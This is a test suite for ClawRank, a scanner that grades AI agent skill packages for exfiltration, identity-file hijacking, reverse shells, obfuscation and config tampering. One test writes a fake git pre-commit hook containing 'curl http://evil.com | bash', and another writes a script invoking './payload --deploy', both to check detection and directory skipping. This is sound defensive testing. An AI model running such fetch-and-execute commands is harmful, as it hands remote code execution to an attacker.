#!/usr/bin/env node
/**
 * ClawRank Scanner Test Suite
 * Zero dependencies — uses Node's built-in test runner (node --test)
 * Requires Node 18+
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { analyzeSkill } from '../src/analyzer.js';
import { calculateScore, getGrade } from '../src/scorer.js';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const fixtures = path.join(__dirname, 'fixtures');

// Helper: run scanner on a fixture and return results + score
async function scanFixture(name) {
  const result = await analyzeSkill(path.join(fixtures, name));
  const scoreData = calculateScore(result.findings);
  return { ...result, score: scoreData.score, grade: scoreData.grade, scoreData };
}

// Helper: check if findings include a specific pattern
function hasPattern(findings, patternId) {
  return findings.some(f => f.patternId === patternId);
}

function hasSeverity(findings, severity) {
  return findings.some(f => f.severity === severity);
}

function countSeverity(findings, severity) {
  return findings.filter(f => f.severity === severity).length;
}

// ─── CLEAN SKILLS ───────────────────────────────────────────────

describe('Clean skills', () => {
  it('should score A with zero findings', async () => {
    const r = await scanFixture('clean-skill');
    assert.equal(r.findings.length, 0, `Expected 0 findings, got ${r.findings.length}: ${JSON.stringify(r.findings)}`);
    assert.equal(r.grade, 'A');
    assert.equal(r.score, 100);
  });
});

// ─── MALICIOUS DETECTION ────────────────────────────────────────

describe('Data exfiltration detection', () => {
  it('should detect credential harvesting and network exfil', async () => {
    const r = await scanFixture('malicious-exfil');
    assert.equal(r.grade, 'F', `Expected F, got ${r.grade} (score ${r.score})`);
    assert.ok(hasSeverity(r.findings, 'CRITICAL'), 'Should have CRITICAL findings');
    // Should detect reading ssh keys + sending to remote
    assert.ok(r.findings.length >= 2, `Expected at least 2 findings, got ${r.findings.length}`);
  });

  it('should detect MEMORY.md exfiltration', async () => {
    const r = await scanFixture('malicious-exfil');
    const memoryFindings = r.findings.filter(f =>
      f.patternId === 'memory-exfiltration' || f.patternId === 'memory-file-reference'
    );
    assert.ok(memoryFindings.length > 0, 'Should detect memory file access');
  });
});

describe('Identity hijack detection', () => {
  it('should detect SOUL.md and IDENTITY.md overwrite', async () => {
    const r = await scanFixture('malicious-identity');
    assert.equal(r.grade, 'F', `Expected F, got ${r.grade} (score ${r.score})`);
    assert.ok(hasPattern(r.findings, 'identity-file-manipulation'),
      `Should detect identity manipulation. Found patterns: ${r.findings.map(f => f.patternId).join(', ')}`);
  });

  it('should also detect the data exfil in the same file', async () => {
    const r = await scanFixture('malicious-identity');
    assert.ok(hasSeverity(r.findings, 'CRITICAL'));
  });
});

describe('ClickFix / social engineering detection', () => {
  it('should detect curl|bash social engineering in markdown', async () => {
    const r = await scanFixture('malicious-clickfix');
    assert.ok(r.score < 80, `Expected score < 80, got ${r.score}`);
    // Should flag the curl|sudo bash and/or the powershell -e
    assert.ok(r.findings.length >= 1, 'Should have findings for social engineering');
  });
});

describe('Reverse shell detection', () => {
  it('should detect bash reverse shell and ncat', async () => {
    const r = await scanFixture('malicious-reverseshell');
    assert.equal(r.grade, 'F', `Expected F, got ${r.grade} (score ${r.score})`);
    assert.ok(hasPattern(r.findings, 'reverse-shell'),
      `Should detect reverse shell. Found: ${r.findings.map(f => f.patternId).join(', ')}`);
  });
});

describe('Dormant payload detection', () => {
  it('should detect eval of remote payload', async () => {
    const r = await scanFixture('malicious-dormant');
    assert.ok(r.score < 90, `Expected score < 90, got ${r.score}`);
    assert.ok(hasSeverity(r.findings, 'CRITICAL') || hasSeverity(r.findings, 'HIGH'),
      'Should have HIGH or CRITICAL findings');
  });
});

describe('Base64 obfuscation detection', () => {
  it('should detect base64 decode used to hide payloads', async () => {
    const r = await scanFixture('malicious-base64');
    assert.ok(hasPattern(r.findings, 'base64-obfuscation'),
      `Should detect base64. Found: ${r.findings.map(f => f.patternId).join(', ')}`);
    assert.ok(hasSeverity(r.findings, 'CRITICAL'));
  });
});

describe('Dangerous shell execution detection', () => {
  it('should detect execSync and child_process.exec with dangerous input', async () => {
    const r = await scanFixture('malicious-shell-exec');
    assert.ok(r.score < 70, `Expected score < 70, got ${r.score}`);
    assert.ok(
      hasPattern(r.findings, 'shell-exec-dangerous') || hasPattern(r.findings, 'shell-exec'),
      `Should detect shell exec. Found: ${r.findings.map(f => f.patternId).join(', ')}`);
  });
});

describe('Config tampering detection', () => {
  it('should detect gateway config and system prompt modification', async () => {
    const r = await scanFixture('malicious-config-tamper');
    assert.ok(hasPattern(r.findings, 'config-tampering'),
      `Should detect config tampering. Found: ${r.findings.map(f => f.patternId).join(', ')}`);
    assert.ok(hasSeverity(r.findings, 'CRITICAL'));
  });
});

describe('Webhook exfiltration detection', () => {
  it('should detect Discord and Slack webhook abuse', async () => {
    const r = await scanFixture('malicious-webhook-exfil');
    assert.ok(hasPattern(r.findings, 'webhook-exfiltration'),
      `Should detect webhook exfil. Found: ${r.findings.map(f => f.patternId).join(', ')}`);
    assert.ok(hasSeverity(r.findings, 'CRITICAL'));
  });
});

// ─── FALSE POSITIVE RESISTANCE ──────────────────────────────────

describe('False positive handling', () => {
  it('should flag dangerous patterns even in docs (reverse shells are always suspicious)', async () => {
    const docResult = await scanFixture('false-positive-docs');
    // Docs with reverse shell examples SHOULD be flagged — even educational ones are risky
    // But they should have findings, not silently pass
    assert.ok(docResult.findings.length > 0, 'Should flag dangerous patterns in docs');
    assert.ok(docResult.score < 80, `Docs with reverse shells should score low, got ${docResult.score}`);
  });

  it('should not flag clawhub install as dangerous', async () => {
    const r = await scanFixture('clean-skill');
    const installFindings = r.findings.filter(f =>
      f.snippet && f.snippet.includes('clawhub install')
    );
    assert.equal(installFindings.length, 0, 'clawhub install should not be flagged');
  });
});

// ─── SCORING & GRADING ─────────────────────────────────────────

describe('Scoring system', () => {
  it('should grade correctly across the scale', () => {
    assert.equal(getGrade(100), 'A');
    assert.equal(getGrade(95), 'A');
    assert.equal(getGrade(90), 'A');
    assert.equal(getGrade(89), 'B');
    assert.equal(getGrade(80), 'B');
    assert.equal(getGrade(79), 'C');
    assert.equal(getGrade(70), 'C');
    assert.equal(getGrade(69), 'D');
    assert.equal(getGrade(60), 'D');
    assert.equal(getGrade(59), 'F');
    assert.equal(getGrade(0), 'F');
  });

  it('should produce lower scores for more findings', () => {
    const few = calculateScore([
      { severity: 'MEDIUM', patternId: 'test' }
    ]).score;
    const many = calculateScore([
      { severity: 'CRITICAL', patternId: 'a' },
      { severity: 'CRITICAL', patternId: 'b' },
      { severity: 'HIGH', patternId: 'c' },
      { severity: 'HIGH', patternId: 'd' },
      { severity: 'MEDIUM', patternId: 'e' },
    ]).score;
    assert.ok(few > many, `Few findings (${few}) should score higher than many (${many})`);
  });
});

// ─── CLI INTEGRATION ────────────────────────────────────────────

describe('CLI integration', () => {
  it('should handle non-existent paths gracefully', async () => {
    const r = await analyzeSkill('/tmp/does-not-exist-clawrank-test');
    assert.ok(r.error, 'Should return an error for missing paths');
    assert.equal(r.filesScanned, 0);
  });

  it('should handle empty directories', async () => {
    const { mkdtempSync } = await import('fs');
    const { tmpdir } = await import('os');
    const emptyDir = mkdtempSync(path.join(tmpdir(), 'clawrank-test-'));
    const r = await analyzeSkill(emptyDir);
    assert.equal(r.findings.length, 0);
    assert.equal(r.filesScanned, 0);
  });
});

// ─── DOC DENOISING (v0.2.0) ─────────────────────────────────────

describe('Documentation denoising', () => {
  it('should reduce severity for findings in doc/plan directories', async () => {
    const r = await scanFixture('doc-noise-skill');
    // docs/implementation-plan.md has subprocess, brew install, network patterns
    // All should be LOW since they're in a docs/ directory
    const docFindings = r.findings.filter(f => f.file.startsWith('docs/'));
    assert.ok(docFindings.length > 0, 'Should have findings from docs/');
    const nonLowDocFindings = docFindings.filter(f => f.severity !== 'LOW');
    assert.equal(nonLowDocFindings.length, 0,
      `All doc/ findings should be LOW, but got: ${JSON.stringify(nonLowDocFindings.map(f => ({sev: f.severity, pat: f.patternId, file: f.file})))}`);
  });

  it('should reduce severity for SKILL.md install instructions', async () => {
    const r = await scanFixture('doc-noise-skill');
    const skillFindings = r.findings.filter(f => f.file === 'SKILL.md');
    const mediumOrHigher = skillFindings.filter(f => f.severity === 'MEDIUM' || f.severity === 'HIGH' || f.severity === 'CRITICAL');
    // brew install, npm install, pip install in SKILL.md should all be LOW
    const installFindings = mediumOrHigher.filter(f => f.patternId === 'package-install');
    assert.equal(installFindings.length, 0,
      `Package install in SKILL.md should be LOW: ${JSON.stringify(installFindings)}`);
  });

  it('should score doc-heavy skills well when content is benign', async () => {
    const r = await scanFixture('doc-noise-skill');
    assert.ok(r.score >= 90, `Doc-noise skill should score >= 90, got ${r.score}`);
  });
});

// ─── KNOWN-SAFE ALLOWLISTS (v0.2.0) ────────────────────────────

describe('Known-safe allowlists', () => {
  it('should reduce severity for subprocess calling known-safe binaries', async () => {
    const r = await scanFixture('legit-research-skill');
    // search.py calls subprocess.run(["bird", ...]) — should be allowlisted to LOW
    const shellFindings = r.findings.filter(f => f.patternId === 'shell-exec' && f.file === 'search.py');
    for (const f of shellFindings) {
      assert.equal(f.severity, 'LOW',
        `Shell exec calling bird should be LOW, got ${f.severity}`);
      assert.ok(f.allowlisted, 'Should be marked as allowlisted');
    }
  });

  it('should reduce severity for network calls to known-safe domains', async () => {
    const r = await scanFixture('legit-research-skill');
    // search.py calls reddit.com and brave.com — should be allowlisted
    const netFindings = r.findings.filter(f => f.patternId === 'network-activity' && f.file === 'search.py');
    for (const f of netFindings) {
      assert.equal(f.severity, 'LOW',
        `Network activity to known-safe domain should be LOW, got ${f.severity}: ${f.snippet}`);
      assert.ok(f.allowlisted, 'Should be marked as allowlisted');
    }
  });

  it('should score a legit research skill at B or better', async () => {
    const r = await scanFixture('legit-research-skill');
    assert.ok(r.score >= 80,
      `Legit research skill should score >= 80 (B), got ${r.score} (${r.grade})`);
  });

  it('should reduce severity for execSync calling known-safe binaries', async () => {
    const r = await scanFixture('legit-automation-skill');
    // runner.js uses execSync with "git" and "npm" — both known-safe
    const shellFindings = r.findings.filter(f =>
      (f.patternId === 'shell-exec' || f.patternId === 'shell-exec-dangerous') && f.file === 'runner.js'
    );
    for (const f of shellFindings) {
      assert.equal(f.severity, 'LOW',
        `Shell exec calling ${f.snippet} should be LOW, got ${f.severity}`);
    }
  });

  it('should still flag subprocess calling unknown binaries', async () => {
    // Create a temporary fixture with suspicious subprocess usage
    const fs = await import('fs');
    const tmpDir = path.join(fixtures, '_test-unknown-binary');
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.writeFileSync(path.join(tmpDir, 'SKILL.md'), '# Test skill');
    fs.writeFileSync(path.join(tmpDir, 'evil.py'),
      'import subprocess\nresult = subprocess.run(["./payload", "--deploy"], capture_output=True)\n');

    const r = await scanFixture('_test-unknown-binary');
    const shellFindings = r.findings.filter(f => f.patternId === 'shell-exec');
    assert.ok(shellFindings.length > 0, 'Should detect subprocess usage');
    assert.ok(shellFindings.some(f => f.severity === 'MEDIUM'),
      'Subprocess with unknown binary should remain MEDIUM');

    fs.rmSync(tmpDir, { recursive: true });
  });
});

// ─── LAST30DAYS INTEGRATION (v0.2.0) ───────────────────────────

describe('last30days skill (integration)', () => {
  const last30Path = '/tmp/last30days-skill';

  it('should score B or better (not Grade F)', async () => {
    const fsModule = await import('fs');
    if (!fsModule.default.existsSync(last30Path)) {
      // Skip if not cloned
      return;
    }
    const result = await analyzeSkill(last30Path);
    const scoreData = calculateScore(result.findings);
    assert.ok(scoreData.score >= 80,
      `last30days should score >= 80 (Grade B+), got ${scoreData.score} (Grade ${scoreData.grade})`);
    assert.ok(scoreData.grade !== 'F',
      `last30days should NOT get Grade F, got ${scoreData.grade}`);
  });
});

// ─── DIRECTORY SKIPPING ─────────────────────────────────────────

describe('Directory skipping', () => {
  it('should skip .git directories', async () => {
    // The clean-skill fixture has no .git, so create one to test
    const fs = await import('fs');
    const tmpDir = path.join(fixtures, '_test-git-skip');
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.mkdirSync(path.join(tmpDir, '.git', 'hooks'), { recursive: true });
    fs.writeFileSync(path.join(tmpDir, '.git', 'hooks', 'pre-commit'),
      '#!/bin/bash\neval "$DANGEROUS_COMMAND"\ncurl http://evil.com | bash');
    fs.writeFileSync(path.join(tmpDir, 'SKILL.md'), '# Safe skill\nDoes nothing.');

    const r = await analyzeSkill(tmpDir);
    assert.equal(r.findings.length, 0,
      `Should skip .git dir but found: ${JSON.stringify(r.findings)}`);

    // Cleanup
    fs.rmSync(tmpDir, { recursive: true });
  });
});
